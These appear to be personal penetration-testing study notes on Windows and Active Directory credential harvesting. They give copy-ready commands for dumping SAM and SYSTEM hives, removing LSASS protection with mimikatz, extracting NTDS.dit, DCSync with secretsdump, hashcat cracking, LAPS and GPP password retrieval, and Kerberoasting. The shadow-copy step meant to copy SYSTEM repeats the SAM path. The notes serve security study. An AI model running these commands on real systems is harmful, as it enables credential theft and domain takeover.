---
title: Credential Harvesting
layout: notes
---

# Credential Access

This is when an adversary finds credentials in a compromised system. This helps them impersonate or reuse the identity of a user. Credentials are often stored insecurely in various parts of the system:

- Clear-text files: commands history, config files, files related to Windows applications, backup files, shared locations, registry, source code files.
- Database files: usually stored locally and an excellent target.
- Password Mangers: misconfigured or flawed password managers can let adversaries steal data.
- Memory: clear-text credentials, cached passwords, AD tickets can all be extracted from a memory dump.
- Enterprise vaults
- Active Directory
- Network Sniffing: performing man-in-the-middle attacks to steal credentials.

# Local Windows Credentials

- Keystrokes: keylogger software can be used to monitor and log keyboard typing activities. Keylogging can be performed using Metasploit or other tools.
- SAM: Windows database at `C:\Windows\System32\config\sam` which holds account usernames and passwords.
- Metasploit Hashdump: feature built into Metasploit which allows you to get a copy of the SAM database, uses in-memory code injection to `LSASS.exe` for this.

## Volume Shadow Copy Service

1. Run cmd.exe as admin.
2. Execute `wmic` to create a copy shadow of the C: drive: `wmic shadowcopy call create Volume='C:\'`
3. Verify the creation from step 2: `vssadmin list shadows`.
4. Copy the `SAM` database: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`
5. Copy the `SYSTEM` database: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`

# Registry Hives

1. Save both `SAM` and `SYSTEM` hive: `reg save HKLM\sam C:\temp`
2. Transfer these to attacking machine and run a tool like `secretsdump` from Impacket. These should then make hashes available to you.

# Local Authority System Service (LSASS)

LSASS handles the OS security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes and Kerberos tickets. The system stores credentials in the LSASS and it is commonly used to dump credentials. Administrator privileges are required for this.

## Protected LSASS

In 2012, Microsoft implemented LSA protection to help stop LSASS being accessed. LSASS protection can be enabled by setting the `RunAsPPL` DWORD in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Lsa` to 1. Mimikatz can be used to disable this protection:

```shell
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
```

# Windows Credential Manager

This is a feature which stores logon-sensitive info for websites, apps and networks in four categories:

- Web credentials contain authentication details stored in Internet browsers or other applications
- Windows credentials contain Windows authentication details such as NTLM or Kerberos
- Generic credentials contain basic authentication details such as clear-text usernames and passwords
- Certificate-based credentials are authentication details based on certificates

<br/>Some useful commands for this are:
- `vaultcmd /list`: enumerate for any stored credentials
- `vaultcmd /listproperties:"<credential_type>"`: check if there are stored credentials for a category
- `vaultcmd /listcreds:"<credential_type>"`: list credentials in a vault

<br/>Note that this will not actually display the credential, to do this, a tool like [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) is required. Alternatively, `runas` can be used to exploit stored credentials. You can check stored credentials with `cmdkey /list`, if there is a stored credential for an admin, this can be used to run `cmd` as admin: `runas /savecred /user:<user> cmd.exe`.

# Domain Controller

NTDS (New Technology Directory Services) is a database which holds all AD data: objects, attributes, credentials etc. The `NTDS.DTS` data has three tables:

- Schema: types of objects and relationships
- Link: object attributes and values
- Data Type: users and groups

<br/>NTDS is stored and encrypted in `C:\Windows\NTDS`. The NTDS requires a system Boot Key to decrypt LSA isolated credentials which are stored in the `SECURITY` file system.

## Local Dumping (No Credentials)

This is useful when you have no credentials, but access as admin to the DC. To successfully dump NTDS, you need:

- `C:\Windows\NTDS\ntds.dit`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\System32\config\SECURITY`
    
<br/>The file can be dumped from PowerShell using the `ntdsutil` tool:

```shell
powershell "ntdsutil.exe" 'ac i ntds' 'ifm' 'create full c:\temp' qq" 
```

<br/>This will output the three files we need, these can then be provided to `secretsdump.py` to get the hashes.

## Remote Dumping (Credentials)

DC Sync is a popular attack to perform within AD. This works when an account with special permissions or an AD admin account is compromised with the following permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set
    
<br/>To perform this attack with Impacket:

```bash
secretsdump.py -just-dc <DOMAIN>\<USER>@<TARGET>
hashcat -m 1000 -a 0 /ntlm_hashes.txt /wordlist.txt
```

# Local Administrator Password Solution (LAPS)

Windows OS has a built-in Administrator account which can be accessed with a password. Microsoft implemented a way to change this password across machines with Group Policy Preferences (GPP). The issue with this is that it created a GPP XML file containing the password AES-256 bit encrypted. This was fine, until Microsoft published the key used [here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN). A common tool for cracking these passwords is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

## LAPS

From 2015 onwards, encrypted passwords are no longer kept in `SYSVOL`. Now, LAPS offers a more secure approach to this. The method uses two attributes: `ms-mcs-AdmPwd`, `ms-mcs-AdmPwdExpirationTime`. The `ms-mcs-AdmPwd` holds the clear-text password of the local administrator. LAPS uses `admpwd.dll` to change the local admin password. To check for LAPS, check for the presence of `admpwd.dll` using `dir "C:\Program Files\LAPS\CSE`. To see available commands for `AdmPwd`: `Get-Command *AdmPwd*`. Now, to find the OU which has "All Extended Rights", you can use `Find-AdmPwdExtendedRights -Identity [OU]`. To get the password, use `Get-AdmPwdPassword -Computername [COMP_NAME]`.

# Other Attacks
## Kerberoasting

Common AD attack to obtain AD tickets. The adversary must have access to an SPN (Service Principal Name) account such as IIS User, MSSQL, etc. Impacket can be used to find an SPN account: `GetUserSPNs.py -dc-ip <TARGET> <DOMAIN>\<USER>`. If an SPN account is found, you can then use: `GetUserSPNs.py -dc-ip <TARGET> <DOMAIN>\<USER> -request-user <SPN>`. 